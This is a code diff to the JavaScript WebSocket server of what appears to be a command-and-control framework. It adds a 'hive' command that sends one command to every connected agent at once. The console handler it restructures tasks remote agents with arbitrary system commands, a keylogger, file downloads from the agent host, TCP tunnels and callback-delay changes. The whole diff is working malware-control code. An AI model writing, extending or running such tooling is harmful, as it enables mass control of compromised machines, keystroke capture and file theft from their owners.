@@ -82,6 +82,7 @@ export const setupWS = (httpServer) => {
       "freeze": "Freeze the agent (don't send tasks)",
       "unfreeze": "Unfreeze the agent",
       "help/?": "You are looking at it :)",
+      "hive <cmd>": "Task all agents with the given command",
       "kill <id>": "Kill a running task",
       "tasks": "List running tasks",
       "tunnel <lhost>:<lport> <rhost>:<rport>": "Start a TCP tunnel",
@@ -97,160 +98,169 @@ export const setupWS = (httpServer) => {
     client.on("agent_console_input", async (data) => {
 
       try{
-        const agent = data.agent;
-        const agentID = agent.uid;
-        const input = data.input.toString().trim();
-        client.emit("agent_console_output", {
-          agentID, prompt: username, msg: input
-        });
-        if (input === "help" || input === "?"){
-          const agentHelp = {...helpData};
-          if (agent.agentType === 0){ // The main C agent
-            agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
-          }
-          let cmds = Object.keys(agentHelp).sort();
-          let maxLen = 0;
-          for (let cmd of cmds){
-            if (cmd.length > maxLen)
-              maxLen = cmd.length;
-          }
-          let helpPage = `  ${"COMMAND".padEnd(maxLen, " ")}  ${"FUNCTION"}\n`;
-          helpPage += `  ${"".padEnd(maxLen, "-")}  ${"--------------------"}\n`;
-          for (let cmd of cmds)
-            helpPage += `  ${cmd.padEnd(maxLen, " ")}  ${agentHelp[cmd]}\n`
+        let input = data.input.toString().trim();
+        let agents = [];
+        if (input.startsWith("hive ")){
+          input = input.substr(5).trim();
+          agents = await agentModel.getAgents();
+        }else{
+          agents.push(data.agent);
+        }
+        for (let i = 0; i < agents.length; i++){
+          const agent = agents[i];
+          const agentID = agent.uid;
           client.emit("agent_console_output", {
-            agentID, msg: helpPage
+            agentID, prompt: username, msg: input
           });
-        }else if (input.startsWith("system ")){ // Create a system command task
-          let cmd = input.substr(7).trim();
-          const taskData = {agentID, taskType: "system", data: {cmd}};
-          taskModel.createTask(username, taskData).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input === "freeze"){ // Freeze an agent.
-          agentModel.freezeAgent(agentID, username).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input === "unfreeze"){ // Unfreeze an agent.
-          agentModel.unfreezeAgent(agentID, username).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("delete task ")){ // Delete a task.
-          let taskID = input.substr(12).trim();
-          taskModel.deleteTask(agentID, taskID, username).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input === "delete agent"){ // Delete the agent.
-          agentModel.deleteAgent(agentID, username).then(async () => {
-            await taskModel.deleteAllTasks(agentID);
-            await fileModel.deleteAllFiles(agentID);
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
-          let filename = input.substr(9).trim();
-          taskModel.createTask(username, {
-            agentID, taskType: "download", data: {file: filename}
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
-          let dir = input.substr(9).trim();
-          taskModel.createTask(username, {
-            agentID, taskType: "writedir", data: {dir}
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("keymon ")){ // Start a keylogger.
-          let duration = parseInt(input.substr(7).trim());
-          taskModel.createTask(username, {
-            agentID, taskType: "keymon", data: {duration}
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("delay ")){
-          let delay = input.substr(6).trim();
-          if (isNaN(delay)){
+          if (input === "help" || input === "?"){
+            const agentHelp = {...helpData};
+            if (agent.agentType === 0){ // The main C agent
+              agentHelp["keymon <secs>"] = "Run a keylogger for given seconds";
+            }
+            let cmds = Object.keys(agentHelp).sort();
+            let maxLen = 0;
+            for (let cmd of cmds){
+              if (cmd.length > maxLen)
+                maxLen = cmd.length;
+            }
+            let helpPage = `  ${"COMMAND".padEnd(maxLen, " ")}  ${"FUNCTION"}\n`;
+            helpPage += `  ${"".padEnd(maxLen, "-")}  ${"--------------------"}\n`;
+            for (let cmd of cmds)
+              helpPage += `  ${cmd.padEnd(maxLen, " ")}  ${agentHelp[cmd]}\n`
             client.emit("agent_console_output", {
-              agentID,
-              prompt: serverPrompt,
-              msg: "Invalid callback delay: " + delay
+              agentID, msg: helpPage
             });
-          }else{
-            delay = parseInt(delay);
+          }else if (input.startsWith("system ")){ // Create a system command task
+            let cmd = input.substr(7).trim();
+            const taskData = {agentID, taskType: "system", data: {cmd}};
+            taskModel.createTask(username, taskData).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input === "freeze"){ // Freeze an agent.
+            agentModel.freezeAgent(agentID, username).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input === "unfreeze"){ // Unfreeze an agent.
+            agentModel.unfreezeAgent(agentID, username).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("delete task ")){ // Delete a task.
+            let taskID = input.substr(12).trim();
+            taskModel.deleteTask(agentID, taskID, username).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input === "delete agent"){ // Delete the agent.
+            agentModel.deleteAgent(agentID, username).then(async () => {
+              await taskModel.deleteAllTasks(agentID);
+              await fileModel.deleteAllFiles(agentID);
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
+            let filename = input.substr(9).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "download", data: {file: filename}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
+            let dir = input.substr(9).trim();
+            taskModel.createTask(username, {
+              agentID, taskType: "writedir", data: {dir}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("keymon ")){ // Start a keylogger.
+            let duration = parseInt(input.substr(7).trim());
+            taskModel.createTask(username, {
+              agentID, taskType: "keymon", data: {duration}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input.startsWith("delay ")){
+            let delay = input.substr(6).trim();
+            if (isNaN(delay)){
+              client.emit("agent_console_output", {
+                agentID,
+                prompt: serverPrompt,
+                msg: "Invalid callback delay: " + delay
+              });
+            }else{
+              delay = parseInt(delay);
+              const onComplete = async (agent, task) => {
+                if (task.successful)
+                  agent.delay = task.data.delay;
+              };
+              taskModel.createTask(username, {
+                agentID, taskType: "delay", data: {delay}
+              }, onComplete).catch(error => {
+                client.emit("striker_error", error.message);
+              });
+            }
+          }else if (input.startsWith("cd ")){
+            let dirname = input.substr(3).trim();
             const onComplete = async (agent, task) => {
               if (task.successful)
-                agent.delay = task.data.delay;
+                agent.cwd = task.data.dir;
             };
             taskModel.createTask(username, {
-              agentID, taskType: "delay", data: {delay}
+              agentID, taskType: "cd", data: {dir: dirname}
             }, onComplete).catch(error => {
               client.emit("striker_error", error.message);
             });
+          }else if (input.startsWith("tunnel ")){
+            let addrs = input.substr(7).trim();
+            let lhost = addrs.split(":")[0].trim()
+            let lport = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
+            let rhost = addrs.split(" ")[1].trim().split(":")[0].trim();
+            let rport = parseInt(addrs.split(":")[2].trim())
+            if (isNaN(lport) || isNaN(rport))
+              return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
+            if (!(lhost && rhost))
+              return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
+            taskModel.createTask(username, {
+              agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input === "tasks"){
+            let tasks = await taskModel.getTasks(agentID);
+            let running = [];
+            for (let task of tasks){
+              if (task.received === true && task.completed === false)
+                running.push(task);
+            }
+            let msg = "No running tasks at the moment!";
+            if (running.length > 0){
+              msg = "";
+              for (let task of running)
+                msg += ` > ${task.uid} - ${task.taskType}\n`;
+            }
+            return client.emit("agent_console_output", {agentID, msg});
+          }else if (input.startsWith("kill ")){
+            const task = await Task.findOne({uid: input.substr(5).trim()});
+            if (!task)
+              return client.emit("agent_console_output", {agentID, msg: "Invalid task!"});
+            if (!(task.completed === false && task.received === true))
+              return client.emit("agent_console_output", {agentID, msg: "Task already completed, or not yet received by agent!"});
+            taskModel.createTask(username, {
+              agentID, taskType: "kill", data: {uid: task.uid}
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else if (input === "abort"){
+            taskModel.createTask(username, {
+              agentID, taskType: "abort"
+            }).catch(error => {
+              client.emit("striker_error", error.message);
+            });
+          }else{ // Unknown query
+            client.emit("agent_console_output", {
+              agentID,
+              prompt: serverPrompt,
+              msg: "Unknown command: " + input
+            });
           }
-        }else if (input.startsWith("cd ")){
-          let dirname = input.substr(3).trim();
-          const onComplete = async (agent, task) => {
-            if (task.successful)
-              agent.cwd = task.data.dir;
-          };
-          taskModel.createTask(username, {
-            agentID, taskType: "cd", data: {dir: dirname}
-          }, onComplete).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input.startsWith("tunnel ")){
-          let addrs = input.substr(7).trim();
-          let lhost = addrs.split(":")[0].trim()
-          let lport = parseInt(addrs.split(":")[1].trim().split(" ")[0].trim());
-          let rhost = addrs.split(" ")[1].trim().split(":")[0].trim();
-          let rport = parseInt(addrs.split(":")[2].trim())
-          if (isNaN(lport) || isNaN(rport))
-            return client.emit("agent_console_output", {agentID, msg: "Invalid port!"});
-          if (!(lhost && rhost))
-            return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
-          taskModel.createTask(username, {
-            agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input === "tasks"){
-          let tasks = await taskModel.getTasks(agentID);
-          let running = [];
-          for (let task of tasks){
-            if (task.received === true && task.completed === false)
-              running.push(task);
-          }
-          let msg = "No running tasks at the moment!";
-          if (running.length > 0){
-            msg = "";
-            for (let task of running)
-              msg += ` > ${task.uid} - ${task.taskType}\n`;
-          }
-          return client.emit("agent_console_output", {agentID, msg});
-        }else if (input.startsWith("kill ")){
-          const task = await Task.findOne({uid: input.substr(5).trim()});
-          if (!task)
-            return client.emit("agent_console_output", {agentID, msg: "Invalid task!"});
-          if (!(task.completed === false && task.received === true))
-            return client.emit("agent_console_output", {agentID, msg: "Task already completed, or not yet received by agent!"});
-          taskModel.createTask(username, {
-            agentID, taskType: "kill", data: {uid: task.uid}
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else if (input === "abort"){
-          taskModel.createTask(username, {
-            agentID, taskType: "abort"
-          }).catch(error => {
-            client.emit("striker_error", error.message);
-          });
-        }else{ // Unknown query
-          client.emit("agent_console_output", {
-            agentID,
-            prompt: serverPrompt,
-            msg: "Unknown command: " + input
-          });
         }
       }catch(error){
         client.emit("striker_error", error.message);
